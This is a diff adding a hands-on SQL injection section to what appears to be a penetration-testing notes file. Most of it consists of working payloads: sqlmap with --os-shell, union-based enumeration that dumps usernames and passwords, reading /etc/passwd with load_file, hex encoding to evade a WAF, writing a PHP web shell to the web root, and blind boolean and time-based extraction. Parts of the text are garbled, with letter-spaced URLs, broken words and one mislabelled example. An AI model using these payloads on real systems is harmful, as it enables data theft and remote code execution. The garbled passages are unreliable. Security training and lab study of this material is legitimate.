@@ -508,6 +508,372 @@ example.com/output.txt. This technique is also a good way to detect second-
 order SQL injections, since in second-order SQL injections, there is often a
 time delay between the malicious input and the SQL query being executed.
 
+### <font color="red">SQL MAP</font>
+#### automatic detecting SQL Injection:
+command :
+```
+sqlmap -u http://127.0.0.1/sqlilabs/Less-2/?id=1 –dbs
+```
+
+Sqlmap Tip: For finding writable directories sqlmap –os-shell flag can
+be used which, by default, attempts to upload a web shell in common web
+server directories. Additionally, it also allows importing custom wordlists
+files for a more comprehensive testing approach.
+
+_Tip :To optimize SQLMap’s payload selection, you can narrow down the tech-
+niques or sets by using options such as “--technique=E”, which tests for error-
+based SQL injection payloads. Additionally, you can enhance precision by
+using “--test-filter” or “--test-skip” to selectively target payloads, streamlining
+the testing process for known vulnerabilities.
+
+_Tip: In sqlmap, once we have identified an application that is vulnerable to
+Boolean-based SQL injection, we can utilize the technique=B option.
+
+_ou can adjust the time delay for time-based blind SQL injection tests using
+--time-sec. In SQLmap, the default is five seconds, but you can custom-
+ize the delay by specifying an integer after the option._
+
+
+**Sql injection union based**
+ Query without error
+	http://127.0.0.1/sqlilabs/Less-2/?id=1+order+by+3--
+	
+	http://127.0.0.1/sqlilabs/Less-2/?id=1+union+select+null,null,null--
+
+Note: The use of single quote (‘) and double dash (--) in our SQL injec-
+tion approach is due to the type of injection being string-based. In a string-
+based SQL injection, increasing the count arbitrarily does not yield any
+visible results on the screen. This indicates the need to append a single
+quote (‘) with each query to properly close the string context before inject-
+ing our payload.
+3.2.3.6 Determining the Vulnerable Columns
+Now that we know there are three columns, we can use the ‘UNION SELECT’
+statement to extract data from the database. However, before extracting
+data, it’s essential to identify which columns can be used to display data.
+This is because some columns may not be suitable for retrieving data due to
+database constraints or design. To determine the vulnerable columns, we will
+use the following command:
+Example
+
+```
+h t t p : / / 1 2 7 . 0 . 0 . 1 / s q l i l a b s / L e s s - 2 / ? i d = - 1 + u n i o n +select+1,2,3--
+```
+
+Notice that we have used a negative sign before the id. This will nullify the
+original query, ensuring that the data displayed as a result of the SQL injec-
+tion is clearly distinguishable from any data that would have been returned
+by the original query.
+An alternative technique involves using a false statement. The logic here is
+similar: by supplying the logical operator AND with 1 = 0, which is always false,
+we ensure that no data from the original query will be returned. This approach
+makes it easier to identify which columns are capable of displaying data.
+Example
+```
+http://127.0.0.1/sqlilabs/Less-2/?id=and 1 = 0 union select 1,2,3–
+```
+you can use single quote(') , double quote(") percentage symbol (%) percentage symbol  often used in the `Like` clause to search for a specific pattern in the database. if an application improperly allows wildcard searches, which could lead to info disclosure indication of an SQL injection.
+
+**finger Printing database**
+
+using built in functions like : `version()` , `user()`, `database()` 
+
+**Extracting Database Information**
+
+In mysql 5 here is a read-only database named information_schema, which contains
+data such as table names, column names, and the database’s privileges for all
+other databases.
+The access to this information is based on the privileges of
+each MySQL user,
+
+**The information_schema** contains several tables that provide information
+about databases, tables, and columns for retrieving data:
+**information_schema.schemata**: This table contains a list of all the databases
+present on the MySQL server.
+**information_schema.columns**: This table maintains the names of columns in
+every table across all databases.
+
+**Enumerating Databases**:
+Query :
+```
+SELECT * FROM users WHERE id=-1 union select 1,schema_
+name,3 from information_schema.schemata-- LIMIT 0,1;
+```
+
+**Enumerating Tables from the Database**
+Query:
+```
+u n i o n + s e l e c t + n u l l , g r o u p _ c o n c a t ( t a b l e _ n a m e ) ,
+n u l l + f r o m + i n f o r m a t i o n _ s c h e m a . t a b l e s + w h e r e + table_schema='security'--
+```
+**Extracting Columns from Table
+Query:
+```
+Union select null,group_concat(column_name),null from
+information_schema.columns where table_name="security"--
+```
+**Extracting Data from columns**
+Query:
+
+```
+Union select null,group_concat(username,0x3a,password),
+null from security--
+
+```
+
+
+
+### Sql injection to RCE :
+
+**Retrieving Privilage information**
+
+Example :
+
+```
+h t t p : / / 1 2 7 . 0 . 0 . 1 / s e a r c h . p h p ? s e a r c h = t m g m ' U N
+I O N + S E L E C T + A L L + 1 , 2 , g r o u p _ c o n c a t ( p r i v i l e g e _
+type),4+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES--+
+```
+in mysql utilize functions such as `load_file()` and `load data infile` cat retreive data
+
+**Reading files**
+using `load_file` function to read `/etc/passwd` file 
+
+Example:
+
+```
+curl "http://127.0.0.1/search.php?search=tmgm'Union+SE
+LECT+ALL+1,2,load_file('/etc/passwd'),4--+"
+```
+
+<font color=red> NOTE if encountering
+errors when reading a file, convert the string to its hexadecimal equivalent.
+This approach helps when backslashes disrupt the syntax or if a WAF blocks
+file names. </font>
+
+Example:
+```
+http://127.0.0.1/search.php?search=tmgm'Union+SELECT+
+ALL+1,2,load_file(0x2f6574632f686f73746e616d65),4--+
+```
+Alternatively, the entire file content can also be converted into base64 or
+hex. This can be achieved using the “To_base64” functions, which is helpful
+in scenarios where we need to use Out-of-Band queries
+
+Example:
+
+```
+http://127.0.0.1/search.php?search=tmgm'Union+SELECT
++ALL+1,2,To_base64(load_file(0x2f6574632f686f73746e6
+16d65)),4--+
+```
+**Writing Files**
+
+Next we only need to upload a simple PHP backdoor, which would allow us to execute commands on the system. but before we need to determine a writable directory
+
+**Retreiving working directory**
+
+we can query the `secure_file_priv` variable. 
+
+example in mysql :
+
+```
+SELECT @@secure_file_priv;
+```
+
+```
+http://127.0.0.1/search.php?search=tmgm'Union+SELECT+A
+LL+1,2,@@secure_file_priv,4--+
+```
+
+Next we will attempt to upload our php code containing the `\<?php system($\_GET\['cmd']);?>` 
+payload:
+
+```
+UNION+SELECT+ALL+1,2,<?php system([\'cmd\']);?>,4 into
+outfile "/var/www/html/shell.php"--+
+```
+we have used escape characters to handle single quotes , however to avoid errors we could use their hexadecimal equivalent.
+
+```
+http://127.0.0.1/search.php?search=tmgm'UNION+SELECT+AL
+L+1,2,0x3c3f7068702073797374656d285b27636d64275d293b203
+f3e,4+into+outfile+'/var/www/html/shell.php'--+
+```
+## Error based SQL injection 
+
+he `Extrac-tValue()` function in MySQL is designed to generate an error when it fails to
+parse the XML data provided to it. T
+
+o ensure that the ExtractValue() function always triggers an error, we
+will pass a character such as 0x7E, which is equivalent to the symbol (~).
+This will be treated as malformed input, causing the database to generate a
+verbose error message.
+
+_Note: This technique using the ExtractValue() function in SQL injection
+does not require the target database to be an XML database or to store data
+in XML format.
+
+**Extracting server version**
+
+```
+'1 extractvalue(1, CONCAT(0x7e, (SELECT version()),
+0x7e)); --
+```
+**Extracting Table Names**
+
+```
+'1 AND extractvalue(rand(), concat(0x7e, (SELECT concat
+(0x7e, schema_name) FROM information_schema.schemata
+LIMIT 0, 1)))--
+```
+
+**Extracting Specific Table Name from Information_schema**
+
+```
+'1 AND extractvalue(rand(),concat(0x3a,(SELECT concat
+(0x7e,TABLE_NAME) FROM information_schema.TABLES WHERE
+TABLE_NAME="users" LIMIT 0,1)))--
+```
+
+<font color=red>Note: It is important to note that this technique is effective only on MySQL
+version 5.1 or later. Moreover, incorporating the LIMIT function enables the
+extraction of specific data segments from the underlying database, as it helps
+control the amount of data returned by a query.</font>
+
+
+**Prefix and suffix**
+sometimes the vulnerable code could be like this:
+
+```
+$query = "SELECT * FROM users WHERE id = ((' ". $_
+GET["id"]. "')) LIMIT 0,1";
+```
+so if you add the regular order by 1 -- it returns error 
+so we need to scape the `(('` by adding the `'))`
+
+
+### Boolean SQL injection :
+
+ this is typically executed using `“AND”` and `“OR”` operators along with specific conditions to verify data.
+For instance, the following syntax checks whether the first character of the first entry in a
+specified column is “a”:
+```
+' AND SUBSTRING((SELECT column FROM table LIMIT 1), 1, 1) = 'a'
+```
+
+If this condition is true, the server’s response is typically normal or unchanged,
+indicating the condition was met. Conversely, if the first character is not “a”,
+the condition evaluates to false. The server’s response in this case might dif-
+fer from when the condition is true, like returning a different result or no
+result. Let’s consider an application vulnerable to Boolean-based SQL injection.
+
+Example of false statement :
+```
+http://vulnerablebak.com/index.php?users=all'+OR+
+1 = 2--+
+```
+
+**Enumerating the Database User**
+Let’s assume that the database user is “root”, and our goal is to enumerate
+the username
+
+payload:
+```
+'+OR+SUBSTRING(user(),1,1)='a';--+
+```
+
+Based on the response, whether true or false, we can narrow down the range of possible characters. 
+
+
+### Time Based SQL injection 
+
+Depending on the database you are working with, there are built-in functions available to delay responses. For MySQL servers, the SLEEP() and BENCHMARK() functions are commonly used. For MSSQL servers, WAIT FOR DELAY is used, pg_sleep() for PostgreSQL, and so on.
+
+**Testing for Time-Based SQL Injection**
+ IF statement in MySQL
+
+Syntax:
+```
+IF(condition, true_statement, false_statement)
+```
+
+payload:
+```
+'OR IF(1 = 1, SLEEP(5), 0) -- -
+```
+
+We can also use the “time” command in Linux to confirm delay:
+
+```
+time curl" http://127.0.0.1:8080/index.php?id='+OR+IF(1
+%3d1,+SLEEP(5),+0)%20--%20-
+```
+
+**Enumerating Characters Length of Database Name**
+
+Based on this, let’s see how we can confirm the length of the database.
+
+Consider the following payload, which will include a delay of five seconds if the
+length of the database is equivalent to 4.
+
+Payload:
+```
+'OR IF(LENGTH((SELECT DATABASE())) = 4, SLEEP(5), 0) -- -
+```
+
+checking for a Five-Character Database Name(No Delay):
+```
+' OR IF(LENGTH((SELECT DATABASE())) = 5, SLEEP(5), 0) —
+```
+Checking for a Six-Character Database Name (No Delay):
+```
+' OR IF(LENGTH((SELECT DATABASE())) = 6, SLEEP(5), 0) --
+```
+Checking for a Seven-Character Database Name (No Delay):
+```
+' OR IF(LENGTH((SELECT DATABASE())) = 7, SLEEP(5), 0) --
+```
+Checking for an Eight-Character Database Name (5-Second Delay):
+```
+' OR IF(LENGTH((SELECT DATABASE())) = 8, SLEEP(5), 0) --
+```
+
+**Enumerating Database Name**
+
+
+Checking if the first character is “a” (No Delay):
+```
+' OR IF(ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) =
+ASCII('a'), SLEEP(5), 0) -- -
+```
+Checking if the first character is “b” (No Delay):
+```
+' OR IF(ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) =
+ASCII('b'), SLEEP(5), 0) -- -
+```
+Checking if the first character is “t” (5-Second Delay):
+```
+' OR IF(ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) =
+ASCII('t'), SLEEP(5), 0) -- -
+```
+Checking if the second character is “m” (No delay):
+```
+' OR IF(ASCII(SUBSTRING((SELECT DATABASE()), 2, 1)) =
+ASCII('b'), SLEEP(5), 0) -- -
+```
+Checking if the second character is “m” (5-Second Delay):
+```
+' OR IF(ASCII(SUBSTRING((SELECT DATABASE()), 2, 1)) =
+ASCII('m'), SLEEP(5), 0) -- -
+```
+
+### Second-Order SQL Injection:
+
+Second-order SQL injection occurs when input is injected into one part of the application, and the output is revealed later. During this process, the application retrieves and uses stored data without proper validation or sanitization.
+
+
+
+
 ## <font color="red">Escalating the vulnerability </font>
 ### <font color="red">Gain WebShells</font>:
 Let’s say we’re targeting a PHP application. The following piece
